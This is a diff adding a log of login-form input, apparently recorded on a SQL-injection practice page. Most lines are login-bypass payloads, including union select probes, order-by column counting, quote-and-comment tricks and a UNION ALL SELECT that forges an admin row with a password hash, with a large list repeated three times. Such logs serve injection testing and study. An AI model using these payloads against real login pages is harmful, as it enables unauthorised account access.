@@ -1,0 +1,233 @@
+User Name:、Password:
+User Name:\Password:
+User Name:')  union select 1,2  #Password:
+User Name:' union select 1,2  #Password:
+User Name:' order by 1 --+Password:
+User Name:')  union select 1,2  -- Password:
+User Name:')  union select 1,2  --+Password:
+User Name:')  union select 1,2  --\ Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:\Password:
+User Name:\Password:
+User Name:\Password:
+User Name:Password:
+User Name:Password:
+User Name:\Password:
+User Name:')  union select 1,2  -- Password:fasf
+User Name:')  union select 1,2  -- Password:
+User Name:')  union select 1,2  --Password:fasdf
+User Name:')  union select 1,2  --Password:fasdf
+User Name:' union selece 1,2 #Password:
+User Name:' union select 1,2  --Password:
+User Name:' union select 1,2  --Password:122
+User Name:Password:
+User Name:' union select 1,2  --Password:122
+User Name:' union select 1,2  --     Password:12
+User Name:' union select 1,2  --+Password:1221
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:Password:
+User Name:Password:
+User Name:' union select 1,2  --  Password:
+User Name:\Password:
+User Name:1' -- Password:
+User Name:1' -- Password:
+User Name:\Password:
+User Name:1' --Password:
+User Name:1'   --   Password:
+User Name:1' order by 1 #Password:
+User Name:' order by 1 #Password:
+User Name:' order by 3#Password:
+User Name:' union select 1,2 -- Password:
+User Name:adminPassword:admin
+User Name:adminPassword:admin123
+User Name:'Password:
+User Name:admin' -- -Password:admin
+User Name:testPassword:test
+User Name:test' -- -Password:test
+User Name:test'Password:test
+User Name:test' -- -Password:test
+User Name:test'  order by 1-- -Password:test
+User Name:test'  order by 10-- -Password:
+User Name:test'  order by 5-- -Password:
+User Name:test'  order by 4-- -Password:
+User Name:test'  order by 3-- -Password:
+User Name:test'  order by 2-- -Password:
+User Name:test' union select 1,2 -- -Password:test
+User Name:test'Password:
+User Name:1'or'1'='1Password:1'or'1'='1
+User Name:testPassword:test
+User Name:testPassword:test
+User Name:testPassword:test
+User Name:testPassword:test
+User Name:testPassword:test
+User Name:or 1=1Password:or 1=1
+User Name:or 1=1--Password:or 1=1--
+User Name:or 1=1#Password:or 1=1#
+User Name:or 1=1/*Password:or 1=1/*
+User Name:admin' --Password:admin' --
+User Name:admin' #Password:admin' #
+User Name:admin'/*Password:admin'/*
+User Name:admin' or '1'='1Password:admin' or '1'='1
+User Name:admin' or '1'='1'--Password:admin' or '1'='1'--
+User Name:admin' or '1'='1'#Password:admin' or '1'='1'#
+User Name:admin' or '1'='1'/*Password:admin' or '1'='1'/*
+User Name:admin'or 1=1 or ''='Password:admin'or 1=1 or ''='
+User Name:admin' or 1=1Password:admin' or 1=1
+User Name:admin' or 1=1--Password:admin' or 1=1--
+User Name:admin' or 1=1#Password:admin' or 1=1#
+User Name:admin' or 1=1/*Password:admin' or 1=1/*
+User Name:admin') or ('1'='1Password:admin') or ('1'='1
+User Name:admin') or ('1'='1'--Password:admin') or ('1'='1'--
+User Name:admin') or ('1'='1'#Password:admin') or ('1'='1'#
+User Name:admin') or ('1'='1'/*Password:admin') or ('1'='1'/*
+User Name:admin') or '1'='1Password:admin') or '1'='1
+User Name:admin') or '1'='1'--Password:admin') or '1'='1'--
+User Name:admin') or '1'='1'#Password:admin') or '1'='1'#
+User Name:admin') or '1'='1'/*Password:admin') or '1'='1'/*
+User Name:1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055Password:1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+User Name:admin" --Password:admin" --
+User Name:admin" #Password:admin" #
+User Name:admin"/*Password:admin"/*
+User Name:admin" or "1"="1Password:admin" or "1"="1
+User Name:admin" or "1"="1"--Password:admin" or "1"="1"--
+User Name:admin" or "1"="1"#Password:admin" or "1"="1"#
+User Name:admin" or "1"="1"/*Password:admin" or "1"="1"/*
+User Name:admin"or 1=1 or ""="Password:admin"or 1=1 or ""="
+User Name:admin" or 1=1Password:admin" or 1=1
+User Name:admin" or 1=1--Password:admin" or 1=1--
+User Name:admin" or 1=1#Password:admin" or 1=1#
+User Name:admin" or 1=1/*Password:admin" or 1=1/*
+User Name:admin") or ("1"="1Password:admin") or ("1"="1
+User Name:admin") or ("1"="1"--Password:admin") or ("1"="1"--
+User Name:admin") or ("1"="1"#Password:admin") or ("1"="1"#
+User Name:admin") or ("1"="1"/*Password:admin") or ("1"="1"/*
+User Name:admin") or "1"="1Password:admin") or "1"="1
+User Name:admin") or "1"="1"--Password:admin") or "1"="1"--
+User Name:admin") or "1"="1"#Password:admin") or "1"="1"#
+User Name:admin") or "1"="1"/*Password:admin") or "1"="1"/*
+User Name:1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055Password:1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+User Name:testPassword:test
+User Name:or 1=1Password:or 1=1
+User Name:or 1=1--Password:or 1=1--
+User Name:or 1=1#Password:or 1=1#
+User Name:or 1=1/*Password:or 1=1/*
+User Name:admin' --Password:admin' --
+User Name:admin' #Password:admin' #
+User Name:admin'/*Password:admin'/*
+User Name:admin' or '1'='1Password:admin' or '1'='1
+User Name:admin' or '1'='1'--Password:admin' or '1'='1'--
+User Name:admin' or '1'='1'#Password:admin' or '1'='1'#
+User Name:admin' or '1'='1'/*Password:admin' or '1'='1'/*
+User Name:admin'or 1=1 or ''='Password:admin'or 1=1 or ''='
+User Name:admin' or 1=1Password:admin' or 1=1
+User Name:admin' or 1=1--Password:admin' or 1=1--
+User Name:admin' or 1=1#Password:admin' or 1=1#
+User Name:admin' or 1=1/*Password:admin' or 1=1/*
+User Name:admin') or ('1'='1Password:admin') or ('1'='1
+User Name:admin') or ('1'='1'--Password:admin') or ('1'='1'--
+User Name:admin') or ('1'='1'#Password:admin') or ('1'='1'#
+User Name:admin') or ('1'='1'/*Password:admin') or ('1'='1'/*
+User Name:admin') or '1'='1Password:admin') or '1'='1
+User Name:admin') or '1'='1'--Password:admin') or '1'='1'--
+User Name:admin') or '1'='1'#Password:admin') or '1'='1'#
+User Name:admin') or '1'='1'/*Password:admin') or '1'='1'/*
+User Name:1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055Password:1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+User Name:admin" --Password:admin" --
+User Name:admin" #Password:admin" #
+User Name:admin"/*Password:admin"/*
+User Name:admin" or "1"="1Password:admin" or "1"="1
+User Name:admin" or "1"="1"--Password:admin" or "1"="1"--
+User Name:admin" or "1"="1"#Password:admin" or "1"="1"#
+User Name:admin" or "1"="1"/*Password:admin" or "1"="1"/*
+User Name:admin"or 1=1 or ""="Password:admin"or 1=1 or ""="
+User Name:admin" or 1=1Password:admin" or 1=1
+User Name:admin" or 1=1--Password:admin" or 1=1--
+User Name:admin" or 1=1#Password:admin" or 1=1#
+User Name:admin" or 1=1/*Password:admin" or 1=1/*
+User Name:admin") or ("1"="1Password:admin") or ("1"="1
+User Name:admin") or ("1"="1"--Password:admin") or ("1"="1"--
+User Name:admin") or ("1"="1"#Password:admin") or ("1"="1"#
+User Name:admin") or ("1"="1"/*Password:admin") or ("1"="1"/*
+User Name:admin") or "1"="1Password:admin") or "1"="1
+User Name:admin") or "1"="1"--Password:admin") or "1"="1"--
+User Name:admin") or "1"="1"#Password:admin") or "1"="1"#
+User Name:admin") or "1"="1"/*Password:admin") or "1"="1"/*
+User Name:1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055Password:1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+User Name:'or''='Password:'or''='
+User Name:test' union select 1,2 -- -Password:test' union select 1,2 -- -
+User Name:testPassword:test
+User Name:or 1=1Password:or 1=1
+User Name:or 1=1--Password:or 1=1--
+User Name:or 1=1#Password:or 1=1#
+User Name:or 1=1/*Password:or 1=1/*
+User Name:admin' --Password:admin' --
+User Name:admin' #Password:admin' #
+User Name:admin'/*Password:admin'/*
+User Name:admin' or '1'='1Password:admin' or '1'='1
+User Name:admin' or '1'='1'--Password:admin' or '1'='1'--
+User Name:admin' or '1'='1'#Password:admin' or '1'='1'#
+User Name:admin' or '1'='1'/*Password:admin' or '1'='1'/*
+User Name:admin'or 1=1 or ''='Password:admin'or 1=1 or ''='
+User Name:admin' or 1=1Password:admin' or 1=1
+User Name:admin' or 1=1--Password:admin' or 1=1--
+User Name:admin' or 1=1#Password:admin' or 1=1#
+User Name:admin' or 1=1/*Password:admin' or 1=1/*
+User Name:admin') or ('1'='1Password:admin') or ('1'='1
+User Name:admin') or ('1'='1'--Password:admin') or ('1'='1'--
+User Name:admin') or ('1'='1'#Password:admin') or ('1'='1'#
+User Name:admin') or ('1'='1'/*Password:admin') or ('1'='1'/*
+User Name:admin') or '1'='1Password:admin') or '1'='1
+User Name:admin') or '1'='1'--Password:admin') or '1'='1'--
+User Name:admin') or '1'='1'#Password:admin') or '1'='1'#
+User Name:admin') or '1'='1'/*Password:admin') or '1'='1'/*
+User Name:1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055Password:1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+User Name:admin" --Password:admin" --
+User Name:admin" #Password:admin" #
+User Name:admin"/*Password:admin"/*
+User Name:admin" or "1"="1Password:admin" or "1"="1
+User Name:admin" or "1"="1"--Password:admin" or "1"="1"--
+User Name:admin" or "1"="1"#Password:admin" or "1"="1"#
+User Name:admin" or "1"="1"/*Password:admin" or "1"="1"/*
+User Name:admin"or 1=1 or ""="Password:admin"or 1=1 or ""="
+User Name:admin" or 1=1Password:admin" or 1=1
+User Name:admin" or 1=1--Password:admin" or 1=1--
+User Name:admin" or 1=1#Password:admin" or 1=1#
+User Name:admin" or 1=1/*Password:admin" or 1=1/*
+User Name:admin") or ("1"="1Password:admin") or ("1"="1
+User Name:admin") or ("1"="1"--Password:admin") or ("1"="1"--
+User Name:admin") or ("1"="1"#Password:admin") or ("1"="1"#
+User Name:admin") or ("1"="1"/*Password:admin") or ("1"="1"/*
+User Name:admin") or "1"="1Password:admin") or "1"="1
+User Name:admin") or "1"="1"--Password:admin") or "1"="1"--
+User Name:admin") or "1"="1"#Password:admin") or "1"="1"#
+User Name:admin") or "1"="1"/*Password:admin") or "1"="1"/*
+User Name:1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055Password:1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+User Name:'orPassword:'or
+User Name:'or''='Password:'or''='
+User Name:testPassword:test
+User Name:adminPassword:admin
+User Name:adminPassword:dumb
+User Name:JohnPassword:data
+User Name:Johnx77l00dcPassword:data
+User Name:x77l00df'"<=/-*>x77l00dfPassword:data
+User Name:JohnPassword:datax77urnlv
+User Name:JohnPassword:x77urnlw'"<=/-*>x77urnlw
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
